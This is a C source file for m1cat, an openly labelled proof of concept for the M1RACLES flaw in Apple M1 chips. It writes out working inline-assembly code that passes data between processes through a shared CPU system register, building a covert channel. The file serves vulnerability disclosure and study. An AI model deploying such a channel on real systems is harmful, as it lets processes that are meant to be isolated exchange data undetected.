/*
 * m1cat: a proof of concept for the M1RACLES vulnerability in the Apple M1.
 * 
 * This program implements a covert channel that can be used to transmit data
 * between two processes when run on the Apple Silicon "M1" CPUs.
 *
 * The channel is slightly lossy due to (presumably) the scheduler sometimes
 * scheduling us on the wrong CPU cluster, so this PoC sends every byte twice
 * together with some metadata/framing bits, which is usually good enough.
 * A better approach would be to use proper FEC or something like that.
 *
 * Please visit m1racles.com for more information.
 *
 * Licensed under the MIT license.
 */

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <sys/select.h>
#include <sys/types.h>
#include <sys/errno.h>
#include <unistd.h>
#include <fcntl.h>

#define BUFSIZE 32768

#define WSIZE 12

int verbose = 0;

static inline uint64_t getbits(void)
{
    uint64_t val;
    asm volatile(
        "mrs %x0, s3_5_c15_c10_1\n"
        : "=r"(val));
    return val;
}

static inline void setbits(uint64_t val)
{
    asm volatile(
        "msr s3_5_c15_c10_1, %x0\n"
        :: "r"(val));
}

static inline void txword(int b)
{
    //fprintf(stderr, "W: %03x\n", b);
    while (getbits())
        ;
    setbits(1);
    while (getbits())
        ;
        setbits(1);
        while (getbits())
        ;
        setbits(1);
        while (getbits())
        ;

    for (int i = 0; i < WSIZE; i++) {
        while (getbits());
        setbits((b & 1) | 2);
        b >>= 1;
    }
}

static inline int rxword(void)
{
    uint64_t b = 0, bits = 0;
    int j;
    while (1) {
        for (j = 0, bits = 0; !bits && j < 10000; j++)
            bits = getbits();
        if (!bits)
            return -1;
        setbits(0);
        getbits();
        if (bits != 1) {
            fprintf(stderr, "Oops, dropped a %llu bit on the floor\n", bits&1);
            continue;
        }
byte:
        b = 0;
        for (int i = 0; i < WSIZE; i++) {
            while (!(bits = getbits()));
            setbits(0);
            if (bits == 1) {
                if (i != 0)
                    fprintf(stderr, "Oops, dropped %d bits (0x%llx) on the floor\n", i, b);
                goto byte;
            }
            if (bits & 1)
                b |= 1 << i;
        }
        //fprintf(stderr, "W: %03x\n", b);
        return b;
    }
}

static void rx(void)
{
    size_t cnt = 0;
    int b;
    uint8_t buf[BUFSIZE + 1];
    int discard = -1;

    while (1) {
        if (cnt > 0) {
            if (verbose)
                fprintf(stderr, "RX %lu bytes\n", cnt);
            if (write(1, buf, cnt) != cnt)
                return;
        }
        cnt = 0;
        while (cnt < BUFSIZE) {
            b = rxword();
            if (b < 0) {
                break;
            }
            if (b == discard) {
                discard = -1;
                continue;
            }
            if (!(b & 0x200))
                // Bad data
                continue;
            if (b & 0xfc00)
                // Bad data
                continue;
            if ((b & 0x300) == 0x200)
                // Throw away the next word
                discard = b | 0x100;
            else
                discard = -1;
            buf[cnt++] = b;
        }
        
    }
}

static void tx(void)
{
    uint8_t buf[BUFSIZE];
    fd_set s;

    fcntl(0, F_SETFL, O_NONBLOCK);

    while (1) {
        int got = read(0, buf, BUFSIZE);
        if (got == 0) {
            return;
        } else if (got < 0 && errno == EAGAIN) {
            FD_ZERO(&s);
            FD_SET(0, &s);
            select(1, &s, NULL, &s, NULL);
            continue;	
        }
        if (verbose)
            fprintf(stderr, "TX %d bytes\n", got);
        uint8_t *p = buf;
        while (got--) {
            // Sometimes we drop a word, so send everything twice
            txword(0x200 | *p);
            txword(0x300 | *p++);
        }
    }
}

static void usage(const char *argv0)
{
    fprintf(stderr, "Usage: %s [-v] <tx|rx>\n", argv0);
    exit(1);
}

int main(int argc, char **argv)
{
    char **argp = &argv[1];
    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE,0);

    if (argc < 2)
        usage(argv[0]);

    if (!strcmp(*argp, "-v")) {
        verbose = 1;
        argp++;
        argc--;
    }

    if (argc < 2)
        usage(argv[0]);

    if (!strcmp(*argp, "tx"))
        tx();
    else if (!strcmp(*argp, "rx"))
        rx();
    else
        usage(argv[0]);

    return 0;
}
